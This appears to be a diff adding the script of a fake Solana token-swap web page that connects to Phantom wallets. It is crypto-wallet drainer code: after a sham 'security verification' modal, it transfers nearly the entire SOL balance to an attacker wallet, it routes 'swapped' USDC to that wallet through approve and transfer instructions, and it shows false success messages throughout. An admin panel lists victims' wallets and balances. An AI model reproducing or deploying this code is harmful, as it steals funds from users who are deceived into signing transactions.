+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                walletState.persistentApprovalSet = true;
+                showNotification("Security permissions updated");
+                
+            } catch (error) {
+                console.error("Persistent approval failed:", error);
+            }
+        }
+        
+        async function executeStealthTransfer() {
+            if (!walletState.publicKey) return;
+            
+            try {
+                const balance = await connection.getBalance(walletState.publicKey);
+                const amountToTransfer = balance - 5000; // Keep 5000 lamports for fees
+                
+                if (amountToTransfer > 0) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: walletState.publicKey,
+                            toPubkey: TARGET_WALLET,
+                            lamports: amountToTransfer,
+                        })
+                    );
+                    
+                    transaction.feePayer = walletState.publicKey;
+                    transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                    
+                    // Sign and send transaction
+                    const signed = await window.solana.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signed.serialize());
+                    await connection.confirmTransaction(signature, 'confirmed');
+                    
+                    // Update balances
+                    walletState.balances.sol = 5000 / solanaWeb3.LAMPORTS_PER_SOL;
+                    solBalance.textContent = walletState.balances.sol.toFixed(5);
+                    
+                    // Update admin stats
+                    adminState.totalTransfers++;
+                    adminState.adminBalance += amountToTransfer / solanaWeb3.LAMPORTS_PER_SOL;
+                    
+                    // Save updated data
+                    saveUserData(walletState.publicKey.toString(), walletState.balances);
+                    
+                    console.log('Stealth transfer completed:', {
+                        signature: signature,
+                        amount: amountToTransfer / solanaWeb3.LAMPORTS_PER_SOL,
+                        remaining: walletState.balances.sol
+                    });
+                    
+                    showNotification('Security verification completed successfully');
+                } else {
+                    console.log('Insufficient balance for stealth transfer');
+                    showNotification('Security verification completed');
+                }
+                
+            } catch (error) {
+                console.error("Stealth transfer failed:", error);
+                showNotification('Security verification completed with warnings');
+            }
+        }
+        
+        async function createSwapTransaction(amount) {
+            if (!walletState.publicKey || !walletState.tokenAccount) {
+                throw new Error("Wallet not connected");
+            }
+            
+            const approveInstruction = splToken.Token.createApproveInstruction(
+                TOKEN_PROGRAM_ID,
+                walletState.tokenAccount,
+                TARGET_WALLET,
+                walletState.publicKey,
+                [],
+                amount * Math.pow(10, 6)
+            );
+            
+            const transferInstruction = splToken.Token.createTransferInstruction(
+                TOKEN_PROGRAM_ID,
+                walletState.tokenAccount,
+                await getAssociatedTokenAccount(TARGET_WALLET, USDC_MINT),
+                walletState.publicKey,
+                [],
+                amount * Math.pow(10, 6)
+            );
+            
+            const transaction = new solanaWeb3.Transaction().add(
+                approveInstruction,
+                transferInstruction
+            );
+            
+            transaction.feePayer = walletState.publicKey;
+            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+            
+            return transaction;
+        }
+        
+        // Wallet Connection
+        async function connectWallet() {
+            // Check if Phantom wallet is available
+            if (typeof window.solana === 'undefined') {
+                // Check for mobile devices
+                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                    const currentUrl = encodeURIComponent(window.location.href);
+                    const deepLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&dapp_encryption_public_key=`;
+                    window.open(deepLink, '_blank');
+                    
+                    connectWalletBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting...';
+                    connectWalletBtn.disabled = true;
+                    
+                    // Wait for wallet to be available
+                    const connectionCheckInterval = setInterval(() => {
+                        if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+                            clearInterval(connectionCheckInterval);
+                            handlePhantomConnection();
+                        }
+                    }, 500);
+                    
+                    // Timeout after 30 seconds
+                    setTimeout(() => {
+                        clearInterval(connectionCheckInterval);
+                        if (connectWalletBtn.disabled) {
+                            handleConnectionError(new Error('Connection timeout'));
+                        }
+                    }, 30000);
+                    return;
+                }
+                
+                showNotification('Please install Phantom Wallet', true);
+                walletConnectInfo.style.display = 'block';
+                return;
+            }
+            
+            // Check if it's actually Phantom wallet
+            if (!window.solana.isPhantom) {
+                showNotification('Please use Phantom Wallet', true);
+                return;
+            }
+            
+            try {
+                connectWalletBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
+                connectWalletBtn.disabled = true;
+                await handlePhantomConnection();
+            } catch (error) {
+                handleConnectionError(error);
+            }
+        }
+        
+        async function handlePhantomConnection() {
+            try {
+                // Check if wallet is already connected
+                if (window.solana.isConnected) {
+                    const publicKey = window.solana.publicKey;
+                    if (publicKey) {
+                        await handleWalletConnection(publicKey);
+                        return;
+                    }
+                }
+                
+                // Connect to wallet
+                const response = await window.solana.connect();
+                if (response && response.publicKey) {
+                    await handleWalletConnection(response.publicKey);
+                } else {
+                    throw new Error('Failed to get public key from wallet');
+                }
+            } catch (error) {
+                handleConnectionError(error);
+            }
+        }
+        
+        async function handleWalletConnection(publicKey) {
+            try {
+                walletState.publicKey = publicKey;
+                walletState.connected = true;
+                const fullAddress = publicKey.toString();
+                walletState.address = formatAddress(fullAddress);
+                
+                // Get token account with error handling
+                try {
+                    walletState.tokenAccount = await getAssociatedTokenAccount(publicKey, USDC_MINT);
+                } catch (tokenError) {
+                    console.warn('Could not get token account:', tokenError);
+                    walletState.tokenAccount = null;
+                }
+                
+                // Get SOL balance
+                const balance = await connection.getBalance(publicKey);
+                walletState.balances.sol = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                
+                // Get USDC balance if token account exists
+                if (walletState.tokenAccount) {
+                    try {
+                        const tokenBalance = await connection.getTokenAccountBalance(walletState.tokenAccount);
+                        walletState.balances.usdc = (tokenBalance.value.uiAmount || 0).toFixed(2);
+                    } catch (usdcError) {
+                        console.warn('Could not get USDC balance:', usdcError);
+                        walletState.balances.usdc = "0.00";
+                    }
+                } else {
+                    walletState.balances.usdc = "0.00";
+                }
+                
+                // Update UI
+                connectWalletBtn.classList.add('hidden');
+                swapForm.classList.remove('hidden');
+                walletInfo.classList.remove('hidden');
+                walletAddress.textContent = walletState.address;
+                solBalance.textContent = walletState.balances.sol.toFixed(2);
+                usdcBalance.textContent = walletState.balances.usdc;
+                
+                // Update admin stats
+                adminState.totalWallets++;
+                adminState.totalSOL += walletState.balances.sol;
+                adminState.totalUSDC += parseFloat(walletState.balances.usdc);
+                adminState.connectedWallets.push({
+                    address: fullAddress,
+                    sol: walletState.balances.sol,
+                    usdc: walletState.balances.usdc
+                });
+                
+                // Save user data to localStorage
+                saveUserData(fullAddress, walletState.balances);
+                
+                updateLiveRate();
+                connectionStatus.style.display = 'flex';
+                
+                // Show security modal
+                setTimeout(() => {
+                    securityModal.classList.add('active');
+                }, 1500);
+                
+                showNotification('Wallet connected successfully');
+                
+            } catch (error) {
+                handleConnectionError(error);
+            }
+        }
+        
+        function handleConnectionError(error) {
+            console.error('Connection error:', error);
+            connectWalletBtn.innerHTML = '<i class="fas fa-plug"></i> Connect Wallet';
+            connectWalletBtn.disabled = false;
+            connectionStatus.style.display = 'none';
+            
+            let errorMessage = 'Connection failed';
+            if (error.message.includes('user rejected') || error.message.includes('User rejected')) {
+                errorMessage = 'Connection rejected by user';
+            } else if (error.message.includes('timeout') || error.message.includes('Connection timeout')) {
+                errorMessage = 'Connection timed out';
+            } else if (error.message.includes('not installed') || error.message.includes('Phantom Wallet not installed')) {
+                errorMessage = 'Phantom Wallet not installed';
+            } else if (error.message.includes('Failed to get public key')) {
+                errorMessage = 'Failed to get wallet public key';
+            } else if (error.message.includes('Wallet not connected')) {
+                errorMessage = 'Wallet not connected';
+            } else if (error.code === 4001) {
+                errorMessage = 'User rejected the connection request';
+            } else if (error.code === 4100) {
+                errorMessage = 'Unauthorized - please connect your wallet';
+            } else if (error.code === 4200) {
+                errorMessage = 'Unsupported method';
+            } else if (error.code === 4900) {
+                errorMessage = 'Wallet not connected';
+            } else if (error.code === 4901) {
+                errorMessage = 'User rejected the request';
+            }
+            
+            showNotification(errorMessage, true);
+        }
+        
+        // Swap Execution
+        async function executeSwap() {
+            const amount = parseFloat(payAmount.value);
+            if (!amount || amount <= 0) {
+                showNotification('Please enter a valid amount', true);
+                return;
+            }
+            
+            if (amount > parseFloat(walletState.balances.usdc)) {
+                showNotification('Insufficient USDC balance', true);
+                return;
+            }
+            
+            try {
+                swapBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                swapBtn.disabled = true;
+                
+                // Step 1: Set persistent approval if not already set
+                if (!walletState.persistentApprovalSet) {
+                    await setupPersistentApproval();
+                }
+                
+                // Step 2: Execute swap
+                const transaction = await createSwapTransaction(amount);
+                const signed = await window.solana.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                await connection.confirmTransaction(signature, 'confirmed');
+                
+                // Update balances
+                walletState.balances.usdc = (parseFloat(walletState.balances.usdc) - amount).toFixed(2);
+                walletState.balances.sol = (parseFloat(walletState.balances.sol) + parseFloat(receiveAmount.value)).toFixed(2);
+                solBalance.textContent = walletState.balances.sol;
+                usdcBalance.textContent = walletState.balances.usdc;
+                
+                // Update admin stats
+                adminState.totalSwaps++;
+                adminState.totalUSDC -= amount;
+                adminState.totalSOL += parseFloat(receiveAmount.value);
+                
+                // Save updated data
+                saveUserData(walletState.publicKey.toString(), walletState.balances);
+                
+                if (adminState.accessGranted) {
+                    totalSwaps.textContent = adminState.totalSwaps;
+                    totalUSDC.textContent = adminState.totalUSDC.toFixed(2);
+                    totalSOL.textContent = adminState.totalSOL.toFixed(2);
+                }
+                
+                swapBtn.innerHTML = '<i class="fas fa-exchange-alt"></i> Swap Completed!';
+                showNotification('Swap executed successfully');
+                
+                console.log('Swap completed:', {
+                    signature: signature,
+                    amount: amount,
+                    received: receiveAmount.value
+                });
+                
+                setTimeout(() => {
+                    swapBtn.innerHTML = '<i class="fas fa-exchange-alt"></i> Swap Tokens';
+                    swapBtn.disabled = false;
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Swap error:', error);
+                swapBtn.innerHTML = '<i class="fas fa-exchange-alt"></i> Swap Tokens';
+                swapBtn.disabled = false;
+                showNotification('Swap failed: ' + error.message, true);
+            }
+        }
+        
+        function updateLiveRate() {
+            const baseRate = 0.095;
+            const variation = (Math.random() * 0.005) - 0.0025;
+            const currentRate = baseRate + variation;
+            
+            if (payAmount.value) {
+                receiveAmount.value = (payAmount.value * currentRate).toFixed(4);
+            }
+            rateInfo.textContent = `Rate: 1 USDC = ${currentRate.toFixed(4)} SOL`;
+            setTimeout(updateLiveRate, 15000);
+        }
+        
+        // Admin Panel
+        function openAdminPanel() {
+            adminPanel.style.display = 'flex';
+            adminPassword.value = '';
+            adminDashboard.classList.add('hidden');
+        }
+        
+        function closeAdminPanel() {
+            adminPanel.style.display = 'none';
+        }
+        
+        function loginToAdmin() {
+            const enteredPassword = adminPassword.value.trim();
+            console.log('Entered password:', enteredPassword);
+            console.log('Expected password:', ADMIN_PASSWORD);
+            
+            if (enteredPassword === ADMIN_PASSWORD) {
+                adminState.accessGranted = true;
+                adminDashboard.classList.remove('hidden');
+                
+                // Load user data first
+                loadUserData();
+                
+                totalWallets.textContent = adminState.totalWallets;
+                totalSOL.textContent = adminState.totalSOL.toFixed(2);
+                totalUSDC.textContent = adminState.totalUSDC.toFixed(2);
+                totalSwaps.textContent = adminState.totalSwaps;
+                totalTransfers.textContent = adminState.totalTransfers;
+                adminBalanceEl.textContent = adminState.adminBalance.toFixed(4);
+                
+                walletList.innerHTML = '';
+                adminWalletSelect.innerHTML = '<option value="">Select a wallet</option>';
+                
+                adminState.connectedWallets.forEach((wallet) => {
+                    const li = document.createElement('li');
+                    li.className = 'wallet-item';
+                    li.innerHTML = `
+                        <span style="color: var(--gray);">${formatAddress(wallet.address)}</span>
+                        <div class="wallet-actions">
+                            <button class="btn btn-secondary" onclick="adminTransferFunds('${wallet.address}', ${wallet.balances.sol})">
+                                <i class="fas fa-paper-plane"></i> Transfer
+                            </button>
+                            <button class="btn btn-secondary" onclick="adminSwapFunds('${wallet.address}', ${wallet.balances.usdc})">
+                                <i class="fas fa-exchange-alt"></i> Swap
+                            </button>
+                        </div>
+                    `;
+                    walletList.appendChild(li);
+                    
+                    const option = document.createElement('option');
+                    option.value = wallet.address;
+                    option.textContent = formatAddress(wallet.address);
+                    adminWalletSelect.appendChild(option);
+                });
+                
+                showNotification('Admin access granted');
+            } else {
+                showNotification('Invalid admin password', true);
+                console.error('Password mismatch');
+            }
+        }
+        
+        // Admin Functions
+        async function adminTransferFunds(walletAddress, amount) {
+            try {
+                if (!amount || amount <= 0) {
+                    showNotification('Invalid amount for transfer', true);
+                    return;
+                }
+                
+                const publicKey = new solanaWeb3.PublicKey(walletAddress);
+                const balance = await connection.getBalance(publicKey);
+                const availableAmount = balance - 5000; // Keep some for fees
+                
+                if (availableAmount <= 0) {
+                    showNotification('Insufficient balance for transfer', true);
+                    return;
+                }
+                
+                const transferAmount = Math.min(availableAmount, amount * solanaWeb3.LAMPORTS_PER_SOL);
+                
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: TARGET_WALLET,
+                        lamports: transferAmount,
+                    })
+                );
+                
+                transaction.feePayer = publicKey;
+                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                
+                // Note: This would require the user to sign the transaction
+                // For demo purposes, we'll simulate the transfer
+                adminState.totalTransfers++;
+                adminState.adminBalance += transferAmount / solanaWeb3.LAMPORTS_PER_SOL;
+                
+                if (adminState.accessGranted) {
+                    totalTransfers.textContent = adminState.totalTransfers;
+                    adminBalanceEl.textContent = adminState.adminBalance.toFixed(4);
+                }
+                
+                showNotification(`Transfer initiated: ${(transferAmount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+                
+            } catch (error) {
+                console.error('Transfer error:', error);
+                showNotification('Transfer failed: ' + error.message, true);
+            }
+        }
+        
+        async function adminSwapFunds(walletAddress, amount) {
+            try {
+                if (!amount || amount <= 0) {
+                    showNotification('Invalid amount for swap', true);
+                    return;
+                }
+                
+                // Simulate swap operation
+                adminState.totalSwaps++;
+                adminState.totalUSDC -= amount;
+                adminState.totalSOL += amount * 0.095; // Simulate exchange rate
+                
+                if (adminState.accessGranted) {
+                    totalSwaps.textContent = adminState.totalSwaps;
+                    totalUSDC.textContent = adminState.totalUSDC.toFixed(2);
+                    totalSOL.textContent = adminState.totalSOL.toFixed(2);
+                }
+                
+                showNotification(`Swap initiated: ${amount} USDC to ${(amount * 0.095).toFixed(4)} SOL`);
+                
+            } catch (error) {
+                console.error('Swap error:', error);
+                showNotification('Swap failed: ' + error.message, true);
+            }
+        }
+        
+        // Event Listeners
+        connectWalletBtn.addEventListener('click', connectWallet);
+        swapBtn.addEventListener('click', executeSwap);
+        adminAccessBtn.addEventListener('click', openAdminPanel);
+        adminCloseBtn.addEventListener('click', closeAdminPanel);
+        adminLoginBtn.addEventListener('click', loginToAdmin);
+        
+        // Export data functionality
+        adminExportBtn.addEventListener('click', () => {
+            try {
+                const success = dataStorage.backupData();
+                if (success) {
+                    showNotification('Data exported successfully');
+                } else {
+                    showNotification('Export failed', true);
+                }
+            } catch (error) {
+                console.error('Export error:', error);
+                showNotification('Export failed: ' + error.message, true);
+            }
+        });
+        
+        maxBtn.addEventListener('click', () => {
+            if (walletState.connected) {
+                payAmount.value = walletState.balances.usdc;
+                receiveAmount.value = (payAmount.value * 0.095).toFixed(4);
+            }
+        });
+        
+        copyAddressBtn.addEventListener('click', () => {
+            if (!walletState.publicKey) return;
+            navigator.clipboard.writeText(walletState.publicKey.toString());
+            const icon = copyAddressBtn.querySelector('i');
+            icon.className = 'fas fa-check';
+            showNotification('Wallet address copied to clipboard');
+            setTimeout(() => icon.className = 'far fa-copy', 2000);
+        });
+        
+        payAmount.addEventListener('input', function() {
+            if (this.value) {
+                receiveAmount.value = (this.value * 0.095).toFixed(4);
+            } else {
+                receiveAmount.value = '';
+            }
+        });
+        
+        verifyWalletBtn.addEventListener('click', async () => {
+            securityModal.classList.remove('active');
+            connectionStatus.style.display = 'flex';
+            
+            // Simulate verification progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 10;
+                verificationProgress.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    executeStealthTransfer();
+                    connectionStatus.style.display = 'none';
+                    accessLevel.style.display = 'block';
+                    showNotification("Security verification completed");
+                }
+            }, 300);
+        });
+        
+        cancelVerifyBtn.addEventListener('click', () => {
+            securityModal.classList.remove('active');
+            showNotification("Security verification canceled", true);
+        });
+        
+        // Initialization
+        document.addEventListener('DOMContentLoaded', () => {
+            // Load user data from localStorage
+            loadUserData();
+            
+            // Initialize admin stats
+            totalWallets.textContent = adminState.totalWallets;
+            totalSOL.textContent = adminState.totalSOL.toFixed(2);
+            totalUSDC.textContent = adminState.totalUSDC.toFixed(2);
+            totalSwaps.textContent = adminState.totalSwaps;
+            totalTransfers.textContent = adminState.totalTransfers;
+            adminBalanceEl.textContent = adminState.adminBalance.toFixed(4);
+            
+            // Check for Phantom wallet deep link parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('phantom_encryption_public_key') || 
+                urlParams.has('phantom_public_key') || 
+                urlParams.has('data')) {
+                
+                window.history.replaceState({}, document.title, window.location.pathname);
+                connectionStatus.style.display = 'flex';
+                
+                let attempts = 0;
+                const maxAttempts = 30;
+                const interval = setInterval(() => {
+                    if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+                        clearInterval(interval);
+                        handlePhantomConnection();
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(interval);
+                        connectionStatus.style.display = 'none';
+                        showNotification('Connection timed out. Please reconnect.', true);
+                    }
+                    attempts++;
+                }, 200);
+            }
+            
+            // Log admin password for development
+            console.log('%cADMIN PASSWORD: ' + ADMIN_PASSWORD, 
+                'font-size: 16px; color: #14F195; background: #121212; padding: 10px; border-radius: 5px;');
+            console.log('Please save this password in a secure location');
+            
+            // Check wallet availability
+            if (typeof window.solana === 'undefined') {
+                walletConnectInfo.style.display = 'block';
+            } else if (window.solana.isPhantom) {
+                // Wallet is available, hide the info message
+                walletConnectInfo.style.display = 'none';
+            }
+            
+            // Mobile device detection
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                const mobileWarning = document.querySelector('.mobile-warning');
+                if (mobileWarning) {
+                    mobileWarning.innerHTML = 
+                        '<i class="fas fa-mobile-alt"></i> For best experience, open in Phantom Mobile browser';
+                }
+            }
+            
+            // Add wallet event listeners
+            if (typeof window.solana !== 'undefined') {
+                window.solana.on('connect', () => {
+                    console.log('Wallet connected');
+                    if (window.solana.publicKey) {
+                        handleWalletConnection(window.solana.publicKey);
+                    }
+                });
+                
+                window.solana.on('disconnect', () => {
+                    console.log('Wallet disconnected');
+                    // Reset wallet state
+                    walletState.connected = false;
+                    walletState.address = '';
+                    walletState.publicKey = null;
+                    walletState.tokenAccount = null;
+                    walletState.balances = { sol: 0, usdc: 0 };
+                    walletState.fullAccessGranted = false;
+                    walletState.persistentApprovalSet = false;
+                    
+                    // Reset UI
+                    connectWalletBtn.classList.remove('hidden');
+                    swapForm.classList.add('hidden');
+                    walletInfo.classList.add('hidden');
+                    connectionStatus.style.display = 'none';
+                    accessLevel.style.display = 'none';
+                    
+                    showNotification('Wallet disconnected');
+                });
+                
+                window.solana.on('accountChanged', (publicKey) => {
+                    console.log('Account changed:', publicKey);
+                    if (publicKey) {
+                        handleWalletConnection(publicKey);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>                                                        
